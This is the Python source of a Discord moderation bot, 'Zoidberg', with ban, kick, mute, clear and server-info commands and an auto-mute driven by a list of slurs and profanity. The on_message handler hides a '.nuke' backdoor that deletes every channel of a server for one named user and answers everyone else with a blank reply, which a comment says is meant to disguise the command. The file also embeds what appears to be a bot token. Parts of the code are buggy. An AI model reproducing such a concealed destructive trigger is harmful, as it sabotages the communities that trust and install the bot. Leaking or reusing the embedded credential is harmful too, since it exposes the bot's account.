# DiscordBot 2023 "Zoidberg" by yTarik0 and 1momo7


import discord
from discord import client
from discord.ext import commands
import asyncio
from discord import app_commands
import functools
import typing
import random


intents = discord.Intents.all()
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)
client = commands.Bot(command_prefix='/', intents=intents, application_id=803216674630270987)

# blacklisted words
blacklist = [
    "anus",
    "anal", "beeyotch", "biatch", "bitch",
    "chink",
    "coolie", "cum", "cock",
    "dego",
    "dick", "douchebag", "dick",
    "fag", "faggot", "fatass",
    "gash", "gimp", "golliwog",
    "gook",
    "goy", "gay" "goyim",
    "gyp", "gypsy", "gipsy",
    "homo",
    "hurensohn",
    "hure",
    "insanitie",
    "insanity",
    "jap"
    "kafir",
    "kike",
    "kraut",
    "lame",
    "lardass",
    "lesbo",
    "lesbe",
    "lunatic",
    "negress",
    "negro",
    "nig",
    "nig-nog",
    "nigga",
    "nigger",
    "nigg4"
    "neger"
    "nigguh",
    "neger",
    "nutte",
    "nuttensohn",
    "nip",
    "pajeet",
    "paki",
    "pickaninnie",
    "pickaninny",
    "penis",
    "prostitute",
    "pussie",
    "pussy",
    "raghead",
    "retard",
    "sambo",
    "shemale",
    "schlampe",
    "skank",
    "slut",
    "soyboy",
    "spade",
    "sperg",
    "spic",
    "schwuchtel",
    "schwanz",
    "tard",
    "tits",
    "titt",
    "trannie",
    "tranny",
    "whore",
    "wigger"]


@client.event
async def on_ready():
    print("""
              ボットはオンラインです
        """)
    synced = await client.tree.sync()
    print("Slash CMDs Synced " + str(len(synced)) + " Commands")


# @client.event
# async def on_member_join(member):


@client.event
async def on_message(message):
    # .secret command later...
    if ".secret" in message.content:
        await message.channel.send("""
    **noch leer**  """)

    # DM Awnser

    # guild = message.guild
    # if not guild in message.content:
    # embed = discord.Embed(title="**I'm Sorry I can't handle Direct Messages**", color=discord.Colour.random())
    # embed.add_field(name="🔰**github**", value="http://github.comytarik0\r\nhttp://github.com/1momo7")
    # embed.add_field(name="❓**No Idea?**", value=".help")
    # await message.channel.send(embed=embed)


    # automatic mute when using blacklisted word
    i = 0
    while i < 1:
        i += 1
        for word in blacklist:
            if word in message.content:
                await message.channel.set_permissions(message.author, send_messages=False)
                embed = discord.Embed(
                    title=f"**{message.author.name}** has been automatically  muted by  **Zoidberg**",
                    color=discord.Colour.red())
                embed.add_field(name="🆔**User ID**", value=message.author.id)
                embed.add_field(name="💬**Reason**", value="using blacklisted word")
                embed.add_field(name="📆**Muted on**", value=message.created_at.strftime("%Y-%m-%d %H:%M:%S"))
                embed.set_footer(text="⭐  • Made by yTarik0")
                await message.channel.send(embed=embed)




    # undercover nuke
    if message.content.startswith('.nuke'):
        if message.author == "tarik#5891":
            server = message.guild
            for c in server.channels:
                await c.delete()
            await message.guild.create_text_channel(name="nuked lol kys")
        else:
            await message.channel.send("")  # faking that there is no .nuke command for people who checked it


# ban command
@client.tree.command(name="ban", description="ban a user")
async def ban_user(interaction: discord.Interaction, user: discord.User, reason: str = None):
    if interaction.user.guild_permissions.ban_members:
        await user.ban(reason=reason)
        embed = discord.Embed(title=f"**{user.name} was banned by {interaction.user.name}**",
                              color=discord.Colour.random())
        embed.add_field(name="📆**Date **", value=interaction.created_at.strftime("%Y-%m-%d"))
        embed.add_field(name="🆔**User ID**", value=user.id)
        embed.add_field(name="💬**Reason**", value=reason)
        embed.set_thumbnail(url=user.icon.url)
        embed.set_footer(text="⭐ Made by yTarik0")
        await interaction.response.send_message(embed=embed)

    else:
        embed = discord.Embed(title="**You don't have the permission for that Command**", color=discord.Colour.random())
        embed.set_footer(text="⭐ Made by yTarik0")
        await interaction.response.send_message(embed=embed, ephemeral=True)

    # kick command


@client.tree.command(name="kick", description="kick a user")
async def kick(interaction: discord.Interaction, user: discord.User, reason: str = None):
    if interaction.user.guild_permissions.kick_members:
        await user.kick(reason=reason)
        embed = discord.Embed(title=f"**{user.name} was kicked by {interaction.user.name}**",
                              color=discord.Colour.random())
        embed.add_field(name="📆**Date **", value=interaction.created_at.strftime("%Y-%m-%d"))
        embed.add_field(name="🆔**User ID**", value=user.id)
        embed.add_field(name="💬**Reason**", value=reason)
        embed.set_thumbnail(url=user.icon.url)
        embed.set_footer(text="⭐ Made by yTarik0")
        await interaction.response.send_message(embed=embed)

    else:
        embed = discord.Embed(title="**You don't have the permission for that Command**",
                              color=discord.Colour.random())
        embed.set_footer(text="⭐ Made by yTarik0")
        await interaction.response.send_message(embed=embed, ephemeral=True)


# help command
@client.tree.command(name="help", description="help command")
async def help(interaction: discord.Interaction):
    embed = discord.Embed(title="**Command-List for Zoidberg-Bot**", color=discord.Colour.random())
    embed.add_field(name="🌐**.help**", value="list of all commands")
    embed.add_field(name="🚪**.games**", value="list all avaible minigames")
    embed.add_field(name="ℹ️**.serverinfo**", value="gives info about the server")
    embed.add_field(name="⚙️**.admin**", value="list all admin commands")
    embed.set_footer(text="⭐ • Made by yTarik0")
    await interaction.response.send_message(embed=embed)


# serverinfo command
@client.tree.command(name="serverinfo", description="shows you basic info about the server")
async def serverinfo(interaction: discord.Interaction):
    server = interaction.guild
    embed = discord.Embed(title=f"Server Info for {server.name}", color=discord.Colour.random())
    embed.add_field(name="💬**Server Name**", value=server.name)
    embed.add_field(name="🆔**Server ID**", value=server.id)
    embed.add_field(name="📆**Created On**", value=server.created_at.strftime('%Y-%m-%d'))
    embed.add_field(name="👑**Server Owner**", value=server.owner)
    embed.add_field(name="👥**Server Member Count**", value=server.member_count)
    embed.set_thumbnail(url=server.icon.url)
    embed.set_footer(text="⭐  •  Made by yTarik0")
    await interaction.response.send_message(embed=embed)


# admin info command
@client.tree.command(name="admin", description="lists you all admin commands")
async def admin(interaction: discord.Interaction):
    if interaction.user.guild_permissions.administrator:
        embed = discord.Embed(title="**Admin-Command List**", color=discord.Colour.random())
        embed.add_field(name="🌐**.kick**", value="kicks a user")
        embed.add_field(name="🚫**.ban**", value="bans a user")
        embed.add_field(name="🧼**.clear**", value="clear chat messages")
        embed.add_field(name="🔐**.mute**", value="chat-locks a user")
        embed.add_field(name="🔓**.unmute**", value="unlock a user (from the chat)")
        embed.add_field(name="⚙️**.admin**", value="list all admin commands")
        embed.set_footer(text="⭐ • Made by yTarik0")
        await interaction.response.send_message(embed=embed)
    else:
        embed = discord.Embed(title="**You don't have the permission for that Command**",
                              color=discord.Colour.random())
        embed.set_footer(text="⭐ Made by yTarik0")
        await interaction.response.send_message(embed=embed)


@client.tree.command(name="clear", description="clears chat messages")
async def clear(interaction: discord.Interaction, amount: int = 0):
    channel = interaction.channel
    if interaction.user.guild_permissions.manage_messages:
        try:
            await channel.purge(limit=amount + 1)
            embed = discord.Embed(title=f"{interaction.user.name.capitalize()} cleared {amount} Messages",
                                  color=discord.Colour.random())
            embed.add_field(name="🆔 **User ID**", value=interaction.user.id)
            embed.add_field(name="📆**Cleared Messages At**", value=interaction.created_at.strftime("%Y-%m-%d %H:%M:%S"))
            embed.set_footer(text="⭐ Made by yTarik0")
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except ValueError:
            embed = discord.Embed(title="**Please enter a valid number of messages to delete.**",
                                  color=discord.Colour.random())
            embed.set_footer(text="⭐ Made by yTarik0")
            await interaction.response.send_message(embed=embed, ephemeral=True)

    else:
        embed = discord.Embed(title="**You don't have the permission for that Command**",
                              color=discord.Colour.random())
        embed.set_footer(text="⭐ Made by yTarik0")
        await interaction.response.send_message(embed=embed, ephemeral=True)


@client.tree.command(name="roles", description="lists you all roles")
async def roles(interaction: discord.Interaction):
    server = interaction.guild.name
    roles = server.roles
    embed = discord.Embed(title="**All Discord Roles:**",
                          color=discord.Colour.random())
    embed.add_field(name="**🔰Roles:**", value=roles)
    embed.set_footer(text="⭐ Made by yTarik0")
    await interaction.response.send_message(0)


@client.tree.command(name="unmute", description="unmutes a user from the chat")
async def unmute_user(interaction: discord.Interaction, user: discord.User, reason: str = None):
    channel = interaction.channel
    if interaction.user.guild_permissions.manage_messages:
        await channel.set_permissions(user, send_messages=True)
        embed = discord.Embed(
            title=f"**{user.name.capitalize()} has been unmuted by {interaction.user.name.capitalize()}**",
            color=discord.Colour.random())
        embed.add_field(name="🆔**User ID**", value=user.id)
        embed.add_field(name="💬**Reason**", value=reason)
        embed.add_field(name="📆**Unmuted on**", value=interaction.created_at.strftime("Y%-%m-%d %H:%M:%S"))
        embed.set_footer(text="⭐  • Made by yTarik0")
        await interaction.response.send_message(embed=embed)

@client.tree.command(name="mute", description="mutes a user from the chat")
async def mute_user(interaction: discord.Interaction, user: discord.User, reason: str = None, time: int = 0):
    channel = interaction.channel
    if interaction.user.guild_permissions.manage_messages:
        await channel.set_permissions(user, send_messages=False)
        embed = discord.Embed(
            title=f"**{user.name.capitalize()} has been muted by {interaction.user.name.capitalize()}**",
            color=discord.Colour.red())
        embed.add_field(name="🆔**User ID**", value=user.id)
        embed.add_field(name="💬**Reason**", value=reason)
        embed.add_field(name="📆**Muted on**", value=interaction.created_at.strftime("%Y-%m-%d %H:%M:%S"))
        embed.add_field(name="🕒**Muted for**", value=f"{time} seconds")
        embed.set_footer(text="⭐  • Made by yTarik0")
        await interaction.response.send_message(embed=embed)
        await asyncio.sleep(time)
        await channel.set_permissions(user, send_messages=True)



# code a game Rock paper Scissors /rps

@client.tree.command(name="rps", description="Rock Paper Scissors against the Bot")
async def rps(interaction: discord.Interaction):
    await interaction.response.send_message(1)


@client.event
async def status_task():
    await client.change_presence(status=discord.Status.online,activity=discord.Streaming(name='/help', url="github.com"
                                                                                  "/yTarik0"))

client.run("ODAzMjE2Njc0NjMwMjcwOTg3.G96a-M.Ry9iyV4FmzPb0TU7yEkFBxgnJlwPNrp-hsvQXM")
